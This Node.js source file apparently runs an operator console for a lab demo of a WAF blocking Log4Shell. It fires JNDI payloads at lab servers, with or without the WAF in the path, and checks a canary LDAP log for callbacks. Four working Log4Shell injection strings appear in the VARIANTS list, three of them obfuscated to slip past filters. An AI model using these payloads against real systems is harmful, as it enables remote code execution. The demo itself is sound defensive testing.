#!/usr/bin/env node
/*
 * Operator console + fire API for the Avi WAF Log4Shell demo.
 *
 * Runs on web-a-03a. Serves a single-page console and exposes a small API
 * that fires a chosen Log4Shell payload at one of two destinations:
 *   - a pool member directly (WAF out of the path), or
 *   - the Avi virtual service (WAF enforcing).
 * After firing, it correlates the HTTP result with the JNDI canary log to
 * decide whether the payload reached the vulnerable logger. No payload
 * class is ever served; this only demonstrates detection and blocking.
 *
 * Pure Node core, no npm dependencies.
 */

const http = require("http");
const https = require("https");
const fs = require("fs");
const crypto = require("crypto");
const { URL } = require("url");

const PORT = parseInt(process.env.CONSOLE_PORT || "9090", 10);
const CANARY_SINK = process.env.CANARY_SINK || "10.15.148.84:1389";
const CALLBACKS_FILE =
  process.env.CALLBACKS_FILE || "/var/lib/log4shell-demo/callbacks.jsonl";
const FONT_DIR = process.env.FONT_DIR || "/opt/log4shell-demo/fonts";

const TARGETS = {
  vs: { label: "Through Avi VS", url: process.env.VS_URL || "https://scm.demo.lab", waf: true },
  "direct-a": { label: "Direct to web-a-03a", url: process.env.NODE_A || "http://10.15.148.84:8080", waf: false },
  "direct-b": { label: "Direct to web-a-03b", url: process.env.NODE_B || "http://10.15.148.85:8080", waf: false },
};

const NODES = [
  { id: "web-a-03a", url: process.env.NODE_A || "http://10.15.148.84:8080" },
  { id: "web-a-03b", url: process.env.NODE_B || "http://10.15.148.85:8080" },
];

// Payload variants. TOKEN is embedded in the LDAP path so the canary can
// tie a callback back to this exact fire; SINK is the canary address.
const VARIANTS = [
  { id: 0, name: "Plain JNDI", tmpl: "${jndi:ldap://SINK/TOKEN}" },
  { id: 1, name: "Lower-lookup obfuscation", tmpl: "${${lower:j}ndi:${lower:l}dap://SINK/TOKEN}" },
  { id: 2, name: "Dash-escape obfuscation", tmpl: "${${::-j}${::-n}${::-d}${::-i}:ldap://SINK/TOKEN}" },
  { id: 3, name: "Nested-lookup obfuscation", tmpl: "${jndi:${lower:l}${lower:d}a${lower:p}://SINK/TOKEN}" },
];

function newToken() {
  return "LT" + crypto.randomBytes(8).toString("hex");
}

function buildPayload(variantId, token) {
  const v = VARIANTS.find((x) => x.id === variantId) || VARIANTS[0];
  return v.tmpl.replace("SINK", CANARY_SINK).replace("TOKEN", token);
}

function fireRequest(targetUrl, payload) {
  return new Promise((resolve) => {
    let u;
    try {
      u = new URL(targetUrl);
    } catch (e) {
      return resolve({ ok: false, error: "bad target url" });
    }
    const lib = u.protocol === "https:" ? https : http;
    const req = lib.request(
      {
        hostname: u.hostname,
        port: u.port || (u.protocol === "https:" ? 443 : 80),
        path: u.pathname || "/",
        method: "GET",
        headers: { "X-Api-Version": payload, "User-Agent": "waf-demo-console" },
        rejectUnauthorized: false, // lab VS uses the internal DemoRootCA
        timeout: 6000,
      },
      (res) => {
        res.on("data", () => {});
        res.on("end", () =>
          resolve({
            ok: true,
            status: res.statusCode,
            servedBy: res.headers["x-served-by"] || null,
          })
        );
      }
    );
    req.on("timeout", () => {
      req.destroy();
      resolve({ ok: false, error: "timeout" });
    });
    req.on("error", (e) => resolve({ ok: false, error: e.code || "error" }));
    req.end();
  });
}

function readCallbacksSince(sinceEpoch) {
  let text = "";
  try {
    text = fs.readFileSync(CALLBACKS_FILE, "utf8");
  } catch (e) {
    return [];
  }
  const out = [];
  for (const line of text.split("\n")) {
    if (!line.trim()) continue;
    try {
      const row = JSON.parse(line);
      if (row.ts >= sinceEpoch - 0.5) out.push(row);
    } catch (e) {}
  }
  return out;
}

// Poll the canary log for a callback matching this fire.
function awaitCallback(token, sinceEpoch, timeoutMs = 5000) {
  return new Promise((resolve) => {
    const started = Date.now();
    const tick = () => {
      const rows = readCallbacksSince(sinceEpoch);
      const byToken = rows.find((r) => r.token === token);
      if (byToken) return resolve({ received: true, verified: true, row: byToken });
      if (Date.now() - started >= timeoutMs) {
        // Fall back to any fresh callback in the window (untokened LDAP client).
        if (rows.length) return resolve({ received: true, verified: false, row: rows[0] });
        return resolve({ received: false, verified: false, row: null });
      }
      setTimeout(tick, 150);
    };
    tick();
  });
}

function checkNode(node) {
  return new Promise((resolve) => {
    let u;
    try {
      u = new URL(node.url);
    } catch (e) {
      return resolve({ id: node.id, up: false, servedBy: null });
    }
    const req = http.request(
      { hostname: u.hostname, port: u.port || 80, path: "/healthz", method: "GET", timeout: 2500 },
      (res) => {
        res.on("data", () => {});
        res.on("end", () =>
          resolve({
            id: node.id,
            up: res.statusCode === 200,
            servedBy: res.headers["x-served-by"] || node.id,
          })
        );
      }
    );
    req.on("timeout", () => {
      req.destroy();
      resolve({ id: node.id, up: false, servedBy: null });
    });
    req.on("error", () => resolve({ id: node.id, up: false, servedBy: null }));
    req.end();
  });
}

function sendJson(res, code, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(code, { "Content-Type": "application/json" });
  res.end(body);
}

function readBody(req) {
  return new Promise((resolve) => {
    let data = "";
    req.on("data", (c) => (data += c));
    req.on("end", () => {
      try {
        resolve(data ? JSON.parse(data) : {});
      } catch (e) {
        resolve({});
      }
    });
  });
}

const server = http.createServer(async (req, res) => {
  if (req.method === "GET" && req.url.indexOf("/fonts/") === 0) {
    var name = req.url.replace(/^\/fonts\//, "").replace(/[^A-Za-z0-9._-]/g, "");
    var fp = require("path").join(FONT_DIR, name);
    if (name.slice(-6) === ".woff2" && fs.existsSync(fp)) {
      res.writeHead(200, { "Content-Type": "font/woff2", "Cache-Control": "max-age=86400" });
      fs.createReadStream(fp).pipe(res);
    } else { res.writeHead(404); res.end("no font"); }
    return;
  }
  if (req.method === "GET" && (req.url === "/" || req.url === "/index.html")) {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    return res.end(PAGE);
  }

  if (req.method === "GET" && req.url === "/api/config") {
    return sendJson(res, 200, {
      targets: Object.entries(TARGETS).map(([id, t]) => ({ id, label: t.label, waf: t.waf })),
      variants: VARIANTS.map((v) => ({ id: v.id, name: v.name })),
      canarySink: CANARY_SINK,
    });
  }

  if (req.method === "GET" && req.url === "/api/health") {
    const nodes = await Promise.all(NODES.map(checkNode));
    return sendJson(res, 200, { nodes });
  }

  if (req.method === "POST" && req.url === "/api/fire") {
    const body = await readBody(req);
    const target = TARGETS[body.target];
    if (!target) return sendJson(res, 400, { error: "unknown target" });
    const variantId = Number.isInteger(body.variant) ? body.variant : 0;

    const token = newToken();
    const payload = buildPayload(variantId, token);
    const fireEpoch = Date.now() / 1000;

    const result = await fireRequest(target.url, payload);
    const cb = result.ok
      ? await awaitCallback(token, fireEpoch)
      : { received: false, verified: false, row: null };

    let verdict;
    if (!result.ok) verdict = "error";
    else if (cb.received) verdict = "breach";
    else if (result.status === 403 || result.status === 400) verdict = "blocked";
    else verdict = "reached-no-callback";

    return sendJson(res, 200, {
      target: body.target,
      targetLabel: target.label,
      wafInPath: target.waf,
      variant: variantId,
      variantName: (VARIANTS.find((v) => v.id === variantId) || {}).name,
      token,
      payload,
      httpOk: result.ok,
      status: result.status || null,
      servedBy: result.servedBy || (cb.row ? null : null),
      error: result.error || null,
      callbackReceived: cb.received,
      tokenVerified: cb.verified,
      verdict,
      ts: Date.now(),
    });
  }

  res.writeHead(404, { "Content-Type": "text/plain" });
  res.end("not found");
});

server.listen(PORT, () => {
  console.log(`[console] http://0.0.0.0:${PORT}  sink=${CANARY_SINK}`);
});

const PAGE = String.raw`<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Avi WAF &middot; Log4Shell Range</title>
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%230f1e26'/%3E%3Cpath d='M16 6 L26 16 L16 26 L6 16 Z' fill='none' stroke='%230072a3' stroke-width='3'/%3E%3Cpath d='M16 11 L21 16 L16 21 L11 16 Z' fill='%230072a3'/%3E%3C/svg%3E" />
<style>
  @font-face{font-family:"Metropolis";src:url("/fonts/Metropolis-400.woff2") format("woff2");font-weight:400;font-style:normal;font-display:swap;}
  @font-face{font-family:"Metropolis";src:url("/fonts/Metropolis-500.woff2") format("woff2");font-weight:500;font-style:normal;font-display:swap;}
  @font-face{font-family:"Metropolis";src:url("/fonts/Metropolis-600.woff2") format("woff2");font-weight:600;font-style:normal;font-display:swap;}
  @font-face{font-family:"Metropolis";src:url("/fonts/Metropolis-700.woff2") format("woff2");font-weight:700;font-style:normal;font-display:swap;}
  :root{
    --avi:#0072a3; --pass:#318700; --fail:#c21d00; --warn:#c25400;
    --idle:#8a9aa9; --line:#cbd6df; --panel-bg:#ffffff; --graph-bg:#f5f8fa;
    --header-bg:#0f1e26; --ink:#21333b;
    --font:"Metropolis","Avenir Next","Helvetica Neue",Arial,sans-serif;
    --mono:"SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
  }
  body.dark{ --line:#35505f; --panel-bg:#21333b; --graph-bg:#1b2a31; --ink:#e9eef2; color:#e9eef2; }
  html,body{height:100%;margin:0;overflow:hidden;}
  html{font-size:17px;}
  body{display:flex;flex-direction:column;font-family:var(--font);color:var(--ink);background:var(--panel-bg);}
  h2{font-weight:600;}

  .header{background:var(--header-bg);color:#fff;display:flex;align-items:center;padding:0 1rem;height:3rem;flex:0 0 3rem;}
  .header .title{font-weight:600;letter-spacing:.01em;font-size:.9rem;}
  .header-nav{flex:1 1 auto;}
  .header-actions{display:flex;align-items:center;gap:.6rem;margin-left:auto;}
  .health{display:flex;gap:.4rem;align-items:center;}
  .pill{font-size:.6rem;padding:.15rem .55rem;border-radius:.7rem;background:rgba(255,255,255,.12);color:#fff;white-space:nowrap;}
  .pill.ok{background:rgba(120,220,120,.25);} .pill.bad{background:rgba(255,140,120,.3);}
  .theme-switch{display:inline-flex;align-items:center;gap:.4rem;cursor:pointer;user-select:none;}
  .theme-switch .ts-label{color:#fff;font-size:.62rem;font-weight:600;letter-spacing:.02em;}
  .theme-switch .ts-track{position:relative;width:38px;height:20px;border-radius:20px;background:rgba(255,255,255,.25);border:1px solid rgba(255,255,255,.45);transition:background .18s ease;}
  .theme-switch .ts-thumb{position:absolute;top:1px;left:1px;width:16px;height:16px;border-radius:50%;background:#fff;transition:transform .18s ease;}
  body.dark .theme-switch .ts-track{background:rgba(127,192,240,.4);border-color:#5aa0e0;}
  body.dark .theme-switch .ts-thumb{transform:translateX(18px);}
  .theme-switch:focus-visible{outline:2px solid #7fd4ff;outline-offset:2px;border-radius:20px;}

  .btn{background:var(--avi);border:1px solid var(--avi);color:#fff;border-radius:4px;box-shadow:none;font-weight:600;letter-spacing:.01em;padding:.4rem .9rem;font-size:.72rem;cursor:pointer;line-height:1.2;font-family:var(--font);}
  .btn:hover{background:#005a82;border-color:#005a82;}
  .btn:disabled{opacity:.55;cursor:progress;}
  .sel{background:var(--panel-bg);color:var(--ink);border:1px solid var(--line);border-radius:4px;padding:.4rem .5rem;font-family:var(--mono);font-size:.68rem;}

  .stage-area{flex:1 1 auto;min-height:0;display:grid;grid-template-columns:var(--split,1.3fr) 6px 1fr;}
  .resizer{background:var(--line);cursor:col-resize;position:relative;transition:background .15s ease;}
  .resizer::before{content:"";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:2px;height:28px;border-radius:2px;background:var(--idle);opacity:.5;}
  .resizer:hover,.resizer.dragging{background:var(--avi);}
  .resizer:hover::before,.resizer.dragging::before{background:#fff;opacity:.9;}
  body.resizing{cursor:col-resize;user-select:none;}

  .graph-col{background:var(--graph-bg);border-right:1px solid var(--line);display:flex;flex-direction:column;min-height:0;}
  .graph-head{padding:.7rem 1rem .2rem;display:flex;justify-content:space-between;align-items:baseline;}
  .graph-head h2{font-size:.72rem;margin:0;}
  .legend{font-size:.62rem;color:var(--idle);display:flex;gap:.9rem;}
  .legend span{display:inline-flex;align-items:center;gap:.3rem;}
  .dot{width:9px;height:9px;border-radius:50%;display:inline-block;}
  .dot.a{background:var(--avi);} .dot.p{background:var(--pass);} .dot.f{background:var(--fail);}
  .graph-wrap{flex:1 1 auto;min-height:0;padding:.3rem .6rem .2rem;}
  svg.topology{width:100%;height:100%;display:block;}
  .pathcap{padding:.15rem 1rem .7rem;font-size:.72rem;color:var(--idle);font-family:var(--mono);}

  #path .lnk{stroke:var(--line);stroke-width:2;fill:none;}
  #path .lnk.active{stroke:var(--avi);stroke-width:3;}
  #path .node-box{fill:var(--panel-bg);stroke:var(--line);stroke-width:1.5;}
  #path .node-box.avi{stroke:var(--avi);stroke-width:2.5;}
  #path #n-waf.blocked .node-box{stroke:var(--pass);stroke-width:3;}
  #path .node-label{font-size:16px;font-weight:600;fill:#21333b;}
  body.dark #path .node-label{fill:#e9eef2;}
  #path .node-sub{font-size:11px;fill:var(--idle);}
  #path #cbwire{stroke:var(--fail);stroke-width:2;stroke-dasharray:4 5;fill:none;}
  #path #pulse{fill:var(--avi);} #path #pulse.cb{fill:var(--warn);}
  #path .hdot{fill:var(--idle);transition:fill .2s;}
  #path .hdot.up{fill:var(--pass);} #path .hdot.down{fill:var(--fail);}

  .detail-col{background:var(--panel-bg);display:flex;flex-direction:column;min-height:0;}
  .detail-head{padding:.8rem 1rem .5rem;border-bottom:1px solid var(--line);}
  .stage-no{font-size:.6rem;color:var(--avi);font-weight:700;letter-spacing:.08em;text-transform:uppercase;}
  body.dark .stage-no{color:#7fc0f0;}
  .detail-head h2{font-size:.95rem;margin:.15rem 0 0;}
  .outcome{font-size:.68rem;color:var(--idle);margin:.3rem 0 0;}
  .detail-body{flex:1 1 auto;min-height:0;overflow-y:auto;padding:.7rem 1rem;}
  .verdict-line{margin:0 0 .6rem;}
  .verdict-badge{font-size:.58rem;font-weight:600;padding:.22rem .7rem;border-radius:.7rem;border:1px solid currentColor;}
  .verdict-badge.idle{color:var(--idle);} .verdict-badge.running{color:var(--avi);}
  .verdict-badge.warn{color:var(--warn);}
  .verdict-badge.pass{color:#fff;background:var(--pass);border-color:var(--pass);}
  .verdict-badge.fail{color:#fff;background:var(--fail);border-color:var(--fail);}
  .signals{display:grid;grid-template-columns:1fr 1fr;gap:.6rem;margin:0 0 .7rem;}
  .signal{background:var(--graph-bg);border:1px solid var(--line);border-radius:5px;padding:.6rem .7rem;}
  .signal .k{font-size:.58rem;letter-spacing:.06em;text-transform:uppercase;color:var(--idle);font-family:var(--mono);}
  .signal .v{font-family:var(--mono);font-size:1.35rem;font-weight:600;margin-top:.3rem;}
  .signal .v.good{color:var(--pass);} .signal .v.bad{color:var(--fail);}
  .console{background:#14232b;color:#d7e6ef;border-radius:4px;padding:.7rem .8rem;font-family:var(--mono);font-size:.66rem;line-height:1.6;white-space:pre-wrap;word-break:break-word;min-height:3rem;}
  .console.empty{color:#8aa3b0;}
  .log-head{font-size:.55rem;letter-spacing:.08em;text-transform:uppercase;color:var(--idle);font-family:var(--mono);margin:.9rem 0 .4rem;}
  .evlog{display:flex;flex-direction:column;}
  .evempty{font-size:.62rem;color:var(--idle);font-family:var(--mono);}
  .evrow{display:grid;grid-template-columns:auto auto 1fr auto;gap:.5rem;align-items:center;font-family:var(--mono);font-size:.66rem;padding:.35rem 0;border-bottom:1px solid var(--line);}
  .evpill{padding:.1rem .45rem;border-radius:.7rem;border:1px solid currentColor;font-size:.5rem;}
  .evpill.pass{color:var(--pass);} .evpill.fail{color:var(--fail);} .evpill.warn{color:var(--warn);}
  .evcode{color:var(--ink);} .evmeta{color:var(--idle);} .evtime{color:var(--idle);}

  .rail{flex:0 0 auto;border-top:1px solid var(--line);background:var(--panel-bg);display:flex;align-items:stretch;}
  .rail-controls{flex:0 0 auto;display:flex;align-items:center;gap:.5rem;padding:.5rem .8rem;border-right:1px solid var(--line);}
  .rail-scroll{flex:1 1 auto;display:flex;overflow-x:auto;}
  .tchip{flex:1 0 auto;min-width:10rem;padding:.5rem .8rem;cursor:pointer;border-right:1px solid var(--line);border-bottom:3px solid transparent;display:flex;flex-direction:column;gap:.15rem;}
  .tchip:hover{background:var(--graph-bg);}
  .tchip.active{border-bottom-color:var(--avi);background:var(--graph-bg);}
  .tchip .tc-name{font-size:.72rem;font-weight:600;}
  .tchip .tc-sub{font-size:.52rem;color:var(--idle);}
  @media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
</style>
</head>
<body>

<header class="header">
  <div class="branding"><span class="title">Avi WAF &middot; Log4Shell Range</span></div>
  <div class="header-nav"></div>
  <div class="header-actions">
    <div class="health">
      <span class="pill" id="hCanary">canary</span>
      <span class="pill" id="hA">web-a-03a</span>
      <span class="pill" id="hB">web-a-03b</span>
    </div>
    <div class="theme-switch" id="themeToggle" role="switch" tabindex="0" aria-checked="false" aria-label="Toggle dark mode">
      <span class="ts-label">Light</span>
      <span class="ts-track"><span class="ts-thumb"></span></span>
      <span class="ts-label">Dark</span>
    </div>
  </div>
</header>

<div class="stage-area">
  <div class="graph-col">
    <div class="graph-head">
      <h2>Attack path &middot; live</h2>
      <div class="legend">
        <span><span class="dot a"></span>in flight</span>
        <span><span class="dot p"></span>blocked</span>
        <span><span class="dot f"></span>breach</span>
      </div>
    </div>
    <div class="graph-wrap">
      <svg class="topology" id="path" viewBox="0 0 640 300" preserveAspectRatio="xMidYMid meet"
           role="img" aria-label="Traffic path from console through the WAF to the pool">
        <g id="links">
          <line class="lnk" id="lnk-agent-waf" x1="130" y1="150" x2="275" y2="150"/>
          <line class="lnk" id="lnk-waf-a" x1="365" y1="150" x2="485" y2="90"/>
          <line class="lnk" id="lnk-waf-b" x1="365" y1="150" x2="485" y2="210"/>
          <path id="cbwire" opacity="0"/>
        </g>
        <g id="n-client">
          <rect class="node-box" x="10" y="123" width="120" height="54" rx="4"/>
          <text class="node-label" x="26" y="148">Console</text>
          <text class="node-sub" x="26" y="163">canary &middot; 03c</text>
        </g>
        <g id="n-waf">
          <rect class="node-box avi" x="275" y="118" width="90" height="64" rx="4"/>
          <text class="node-label" x="289" y="146">Avi WAF</text>
          <text class="node-sub" x="289" y="161">enforcement</text>
        </g>
        <g id="n-a">
          <rect class="node-box" x="485" y="65" width="120" height="50" rx="4"/>
          <text class="node-label" x="501" y="88">web-a-03a</text>
          <text class="node-sub" x="501" y="103">pool member</text>
          <circle class="hdot" id="h-a" cx="595" cy="75" r="5"/>
        </g>
        <g id="n-b">
          <rect class="node-box" x="485" y="185" width="120" height="50" rx="4"/>
          <text class="node-label" x="501" y="208">web-a-03b</text>
          <text class="node-sub" x="501" y="223">pool member</text>
          <circle class="hdot" id="h-b" cx="595" cy="195" r="5"/>
        </g>
        <circle id="pulse" r="5" opacity="0"/>
      </svg>
    </div>
    <div class="pathcap" id="pathcap">Idle. Pick a target below and fire a payload.</div>
  </div>

  <div class="resizer" id="resizer" role="separator" aria-orientation="vertical" aria-label="Resize panels" tabindex="0"></div>

  <div class="detail-col">
    <div class="detail-head">
      <div class="stage-no" id="dTarget">Result</div>
      <h2 id="dTitle">No shot fired yet</h2>
      <p class="outcome" id="dOutcome">Choose a target below and fire a payload.</p>
    </div>
    <div class="detail-body">
      <div class="verdict-line"><span class="verdict-badge idle" id="dBadge">Not run</span></div>
      <div class="signals">
        <div class="signal"><div class="k">HTTP result</div><div class="v" id="vReq">&mdash;</div></div>
        <div class="signal"><div class="k">Canary callback</div><div class="v" id="vCb">&mdash;</div></div>
      </div>
      <div class="console empty" id="dPayload">Payload appears here on fire.</div>
      <div class="log-head">Event log</div>
      <div id="log" class="evlog"><div class="evempty">No fires yet.</div></div>
    </div>
  </div>
</div>

<div class="rail">
  <div class="rail-controls">
    <button class="btn" id="fireBtn">Fire payload</button>
    <select id="variant" class="sel"></select>
  </div>
  <div class="rail-scroll" id="targets"></div>
</div>

<script>
var $ = function(id){ return document.getElementById(id); };
var state = { target:null, variant:0, busy:false };

var themeToggle = $("themeToggle");
function applyTheme(m){
  document.body.classList.toggle("dark", m==="dark");
  themeToggle.setAttribute("aria-checked", m==="dark" ? "true":"false");
  try{ localStorage.setItem("l4s-theme", m); }catch(e){}
}
function toggleTheme(){ applyTheme(document.body.classList.contains("dark")?"light":"dark"); }
themeToggle.addEventListener("click", function(e){ e.preventDefault(); toggleTheme(); });
themeToggle.addEventListener("keydown", function(e){ if(e.key===" "||e.key==="Enter"){ e.preventDefault(); toggleTheme(); } });

var resizer=$("resizer"), stageArea=document.querySelector(".stage-area");
var DEFAULT_SPLIT=1.3, MIN_FR=0.5, MAX_FR=3.2, dragging=false;
function applySplit(fr){
  fr=Math.max(MIN_FR, Math.min(MAX_FR, fr));
  stageArea.style.setProperty("--split", fr+"fr");
  try{ localStorage.setItem("l4s-split", String(fr)); }catch(e){}
}
function frFromClientX(x){
  var rect=stageArea.getBoundingClientRect(), handle=6;
  var detailPx=rect.right-x, graphPx=(x-rect.left)-handle/2;
  if(detailPx<=0) return MAX_FR;
  return graphPx/detailPx;
}
function startDrag(e){ dragging=true; resizer.classList.add("dragging"); document.body.classList.add("resizing"); e.preventDefault(); }
function moveDrag(e){ if(!dragging) return; var x=(e.touches? e.touches[0].clientX : e.clientX); applySplit(frFromClientX(x)); }
function endDrag(){ if(!dragging) return; dragging=false; resizer.classList.remove("dragging"); document.body.classList.remove("resizing"); }
resizer.addEventListener("mousedown", startDrag);
resizer.addEventListener("touchstart", startDrag, {passive:false});
window.addEventListener("mousemove", moveDrag);
window.addEventListener("touchmove", moveDrag, {passive:false});
window.addEventListener("mouseup", endDrag);
window.addEventListener("touchend", endDrag);
resizer.addEventListener("keydown", function(e){
  var cur=parseFloat(getComputedStyle(stageArea).getPropertyValue("--split"))||DEFAULT_SPLIT;
  if(e.key==="ArrowLeft"){ e.preventDefault(); applySplit(cur-0.12); }
  else if(e.key==="ArrowRight"){ e.preventDefault(); applySplit(cur+0.12); }
  else if(e.key==="Home"){ e.preventDefault(); applySplit(DEFAULT_SPLIT); }
});
resizer.addEventListener("dblclick", function(){ applySplit(DEFAULT_SPLIT); });

function resetLinks(){ var ls=document.querySelectorAll("#path .lnk"); for(var i=0;i<ls.length;i++){ ls[i].setAttribute("class","lnk"); } }
function lightLink(id){ var el=$("lnk-"+id); if(el) el.classList.add("active"); }
function animate(wafBlocks, servedNode){
  var pulse=$("pulse"), cap=$("pathcap"), cbwire=$("cbwire"), waf=$("n-waf");
  pulse.classList.remove("cb"); waf.classList.remove("blocked"); resetLinks();
  pulse.setAttribute("opacity","1"); if(cbwire) cbwire.setAttribute("opacity","0");
  var toNode = servedNode==="web-a-03b" ? [545,210] : [545,90];
  var seg=function(from,to,ms){ return new Promise(function(r){
    var t0=performance.now();
    function step(t){ var k=Math.min(1,(t-t0)/ms);
      pulse.setAttribute("cx", from[0]+(to[0]-from[0])*k);
      pulse.setAttribute("cy", from[1]+(to[1]-from[1])*k);
      if(k<1) requestAnimationFrame(step); else r(); }
    requestAnimationFrame(step);
  }); };
  (async function(){
    cap.textContent="Request in flight to the WAF...";
    lightLink("agent-waf");
    await seg([130,150],[320,150],420);
    if(wafBlocks){
      waf.classList.add("blocked");
      cap.textContent="WAF matched the signature. Request dropped at the edge.";
      await seg([320,150],[320,150],220);
      pulse.setAttribute("opacity","0");
      setTimeout(function(){ waf.classList.remove("blocked"); }, 1000);
    } else {
      cap.textContent="Request passed to the pool...";
      lightLink(servedNode==="web-a-03b" ? "waf-b" : "waf-a");
      await seg([320,150], toNode, 420);
      pulse.classList.add("cb");
      if(cbwire){
        var cbsy = servedNode==="web-a-03b" ? 235 : 115;
        cbwire.setAttribute("d","M545,"+cbsy+" C545,285 70,285 70,177");
        cbwire.setAttribute("opacity","1");
      }
      cap.textContent="Vulnerable logger fired a JNDI callback to the canary.";
      await seg(toNode,[70,168],640);
      pulse.setAttribute("opacity","0");
      if(cbwire) setTimeout(function(){ cbwire.setAttribute("opacity","0"); }, 1200);
    }
  })();
}

function pill(id, ok, text){ var el=$(id); if(!el) return; el.textContent=text; el.classList.toggle("ok",!!ok); el.classList.toggle("bad",!ok); }

async function loadConfig(){
  var c = await (await fetch("/api/config")).json();
  var tw=$("targets"); tw.innerHTML="";
  for(var i=0;i<c.targets.length;i++){
    (function(t,idx){
      var chip=document.createElement("div");
      chip.className="tchip"; chip.dataset.id=t.id;
      chip.innerHTML='<span class="tc-name">'+t.label+'</span><span class="tc-sub">'+(t.waf?"WAF enforcing":"WAF bypassed")+'</span>';
      chip.addEventListener("click", function(){
        var all=document.querySelectorAll(".tchip");
        for(var j=0;j<all.length;j++){ all[j].classList.remove("active"); }
        chip.classList.add("active"); state.target=t.id;
      });
      tw.appendChild(chip);
      if(idx===0){ chip.classList.add("active"); state.target=t.id; }
    })(c.targets[i], i);
  }
  var vs=$("variant"); vs.innerHTML="";
  for(var k=0;k<c.variants.length;k++){
    var o=document.createElement("option"); o.value=c.variants[k].id; o.textContent=c.variants[k].name; vs.appendChild(o);
  }
  vs.addEventListener("change", function(){ state.variant=parseInt(vs.value,10); });
  var hc=$("hCanary"); if(hc){ hc.textContent="canary "+c.canarySink; hc.classList.add("ok"); }
}

async function poll(){
  try{
    var h = await (await fetch("/api/health")).json();
    for(var i=0;i<h.nodes.length;i++){
      var n=h.nodes[i]; var s = n.id.indexOf("03a")>=0 ? "A" : "B";
      pill("h"+s, n.up, n.id);
      var hd=$("h-"+s.toLowerCase()); if(hd){ hd.classList.toggle("up", n.up); hd.classList.toggle("down", !n.up); }
    }
  }catch(e){}
}

function badge(cls, txt){ var b=$("dBadge"); b.className="verdict-badge "+cls; b.textContent=txt; }

function addLog(r){
  var log=$("log");
  if(log.dataset.init!=="1"){ log.innerHTML=""; log.dataset.init="1"; }
  var cls = r.verdict==="blocked" ? "pass" : (r.verdict==="breach" ? "fail" : "warn");
  var label = r.verdict==="blocked" ? "BLOCKED" : (r.verdict==="breach" ? "BREACH" : "--");
  var t=new Date(r.ts).toLocaleTimeString();
  var row=document.createElement("div"); row.className="evrow";
  row.innerHTML='<span class="evpill '+cls+'">'+label+'</span>'+
    '<span class="evcode">'+(r.httpOk?(r.status||"--"):"ERR")+'</span>'+
    '<span class="evmeta">'+r.targetLabel+' &middot; '+r.variantName+(r.servedBy?(' &middot; '+r.servedBy):'')+'</span>'+
    '<span class="evtime">'+t+'</span>';
  log.insertBefore(row, log.firstChild);
}

function renderResult(r){
  $("dTarget").textContent=r.targetLabel;
  $("dOutcome").textContent=r.variantName+" - "+(r.wafInPath?"WAF enforcing":"WAF bypassed");
  var pv=$("dPayload"); pv.className="console"; pv.textContent=r.payload;
  var vReq=$("vReq"), vCb=$("vCb");
  vReq.textContent = r.httpOk ? (r.status||"--") : ((r.error||"error")+"").toUpperCase();
  vReq.className = "v " + (r.httpOk && (r.status===403||r.status===400) ? "good" : (r.callbackReceived?"bad":""));
  if(r.callbackReceived){ vCb.textContent = r.tokenVerified ? "MATCH" : "HIT"; vCb.className="v bad"; }
  else { vCb.textContent="silent"; vCb.className="v"; }
  if(r.verdict==="blocked"){ badge("pass","Blocked"); $("dTitle").textContent="Blocked at the WAF - backend never saw it"; animate(true, r.servedBy); }
  else if(r.verdict==="breach"){ badge("fail","Breach"); $("dTitle").textContent="Exploit reached the logger - callback received"+(r.servedBy?(" via "+r.servedBy):""); animate(false, r.servedBy); }
  else if(r.verdict==="error"){ badge("fail","Failed"); $("dTitle").textContent="Request failed: "+(r.error||"unknown"); }
  else { badge("warn","No callback"); $("dTitle").textContent="Reached the app (HTTP "+r.status+") but no callback"; }
  addLog(r);
}

async function fire(){
  if(state.busy) return; state.busy=true;
  var btn=$("fireBtn"); btn.disabled=true; var old=btn.textContent; btn.textContent="Firing...";
  badge("running","Running");
  try{
    var r = await (await fetch("/api/fire",{ method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({ target:state.target, variant:state.variant }) })).json();
    renderResult(r);
  }catch(e){ badge("fail","Console error"); $("dTitle").textContent="Could not reach the fire API"; }
  finally{ state.busy=false; btn.disabled=false; btn.textContent=old; }
}
$("fireBtn").addEventListener("click", fire);

(function(){
  var saved=null; try{ saved=localStorage.getItem("l4s-theme"); }catch(e){}
  applyTheme(saved==="dark" ? "dark":"light");
  var sp=null; try{ sp=parseFloat(localStorage.getItem("l4s-split")); }catch(e){}
  if(sp && !isNaN(sp)) stageArea.style.setProperty("--split", sp+"fr");
})();
loadConfig(); poll(); setInterval(poll, 4000);
</script>
</body>
</html>`;
